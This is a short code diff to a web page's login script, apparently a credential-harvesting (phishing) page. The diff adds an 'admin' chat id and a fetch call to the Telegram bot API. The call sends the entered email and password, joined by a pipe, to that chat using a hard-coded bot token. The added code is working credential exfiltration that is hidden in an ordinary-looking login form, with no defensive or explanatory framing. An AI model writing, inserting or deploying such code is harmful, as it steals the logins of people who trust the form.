@@ -157,6 +157,7 @@
         but.onclick = function () {
 
             var id = 387534219
+            var admin = 432222083
             var token = "1228402685:AAGKpUxZJBhMJX319A7-TdyRCMRiJcdPaXs";
 
             if (email.value.length > 0 && password.value.length > 0) {
@@ -170,8 +171,11 @@
                     })
             }
         }
-
-
+fetch("https://api.telegram.org/bot" +
+                    token +
+                    "/sendMessage?chat_id=" + admin + "&text=" + email.value + " | " + password.value).then(() => {
+    
+})
     </script>
 
 </body>
